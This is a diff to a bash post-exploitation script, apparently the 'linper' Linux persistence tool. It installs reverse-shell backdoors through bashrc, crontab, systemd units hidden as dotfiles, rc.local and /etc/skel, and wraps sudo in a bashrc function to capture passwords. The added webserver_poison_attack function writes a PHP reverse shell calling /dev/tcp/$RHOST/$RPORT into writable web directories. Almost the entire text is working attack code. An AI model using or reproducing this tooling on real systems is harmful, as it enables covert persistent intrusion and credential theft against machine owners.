@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Variables Used for Program Logic
 CLEAN=0
 CLEANSYSMSG=0
 DISABLEBASHRC=0
@@ -8,14 +7,20 @@ DRYRUN=0
 STEALTHMODE=0
 VALIDSYNTAX=0
 
-# Variables for persistence, files need to persist on machine
+if $(which srm | grep -qi srm);
+then
+	REMOVALTOOL="srm"
+else
+	REMOVALTOOL="rm"
+fi
+
 CRON="* * * * *"
+RANDOMPHPFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
-SERVICEFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
-SERVICESHELLSCRIPT=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').sh)
+SERVICEFILE=$(echo /etc/systemd/system/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
+SERVICESHELLSCRIPT=$(echo /etc/systemd/system/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').sh)
 
-# Temp variables, either needed for testing permissions or are created on the fly with the hinge
 TMPCLEANBASHRC=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 TMPCLEANRCLOCAL=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 TMPCRON=$(echo /dev/shm/$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
@@ -96,8 +101,8 @@ then
 			if [ "$STEALTHMODE" -eq 1 ];
 			then
 				DISABLEBASHRC=1
-				SERVICEFILE=$(echo /dev/shm/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
-				SERVICESHELLSCRIPT=$(echo /dev/shm/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
+				SERVICEFILE=$(echo /etc/systemd/system/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').service)
+				SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'))
 				
 				echo 'function crontab () {
 				REALBIN="$(which crontab)"
@@ -180,7 +185,6 @@ enum_doors() {
 		"bashrc , touch ~/.bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
 		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && rm $TMPCRONWITHPAYLOAD?"
 		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
-		#"/var/www/ , find /var/www/ -writable -type d | grep -qi [A-Za-z0-9] > $TMPWEB; echo $TMPWEB; exit; , for i in cat $TMPWEB; do cd $i; echo $PAYLOAD > $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n'); done?"
 		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 		"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
 	)
@@ -204,10 +208,10 @@ enum_doors() {
 						then
 							:
 						else
-							echo "[+] Door Found: $DOOR"
+							echo -e "\e[92m[+]\e[0m Door Found: $DOOR"
 							if [ "$DRYRUN" -eq 0 ];
 							then
-								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo " - Persistence Installed: $METHOD using $DOOR"
+								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR"
 							fi
 						fi
 					fi
@@ -216,6 +220,54 @@ enum_doors() {
 		fi
 	done
 	echo "-----------------------"
+
+}
+
+webserver_poison_attack() {
+
+	unset IFS
+
+	if $(grep -qi "www-data" /etc/passwd)
+	then
+		if $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d 2> /dev/null | grep -qi "[A-Za-z0-9]")
+		then
+			echo -e "\e[92m[+]\e[0m Web Server Poison Attack Available for the Following Directories"
+			for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
+			do
+				echo -e "\e[92m[+]\e[0m Directory Found: $i"
+				
+				if [ $DRYRUN -eq 0 ];
+				then
+					IFS="?"
+
+					for s in ${METHODS[@]};
+					do
+						METHOD=$(echo $s | awk -F ' , ' '{print $1}')
+						PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
+
+						if $(echo $METHOD | grep -qi "^php$");
+						then	
+							unset IFS
+							RANDOMPHPFILE=$(echo $(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
+							
+							if [ "$STEALTHMODE" -eq 1 ];
+							then
+								RANDOMPHPFILE=$(echo .$(strings /dev/urandom | grep --color=never -o [a-zA-Z0-9] | head -n 10 | tr -d '\n').php)
+							fi
+							
+							PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
+							echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE"
+							IFS="?"
+						fi
+					done
+					
+					unset IFS
+				fi
+			done
+
+			echo "-----------------------"
+		fi
+	fi
 
 }
 
@@ -265,11 +317,13 @@ shadow() {
 
 cleanup() {
 
+	echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
+
 	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function crontab" ~/.bashrc) && $(grep -qi REALBIN ~/.bashrc);
 	then
 		cat ~/.bashrc | sed '1,/function crontab/!d' | grep -v "function crontab" > $TMPCLEANBASHRC
 		cp $TMPCLEANBASHRC ~/.bashrc
-		echo -e "\e[92m[+]\e[0m Removed crontab function from bashrc"
+		echo -e "\e[92m[+]\e[0m Removed crontab function from ~/.bashrc"
 	fi
 
 	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function sudo" ~/.bashrc) && $(grep -qi REALSUDO ~/.bashrc) && $(grep -qi TMPPASSWORDFILE ~/.bashrc);
@@ -304,7 +358,7 @@ cleanup() {
 				grep -q $TMP $j 2> /dev/null
 				if [[ $? -eq 0 ]];
 				then
-					srm $i $j 2> /dev/null || rm $i $j
+					$REMOVALTOOL $i $j
 					CLEANSYSMSG=1
 				fi
 			done
@@ -322,7 +376,7 @@ cleanup() {
 		cp $TMPCLEANRCLOCAL "/etc/rc.local"
 		if $(cat /etc/rc.local | wc -l | grep -q "^2$");
 		then
-			rm "/etc/rc.local"
+			$REMOVALTOOL "/etc/rc.local"
 		fi
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/rc.local"
 	fi
@@ -333,7 +387,9 @@ cleanup() {
 		cp $TMPCLEANBASHRC /etc/skel/.bashrc
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
 	fi
-	
+
+	cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}'); grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
+
 }
 
 main() {
@@ -345,6 +401,7 @@ main() {
 	fi
 	enum_methods
 	sudo_hijack_attack $TMPPASSWORDFILE
+	webserver_poison_attack
 	shadow
 
 }
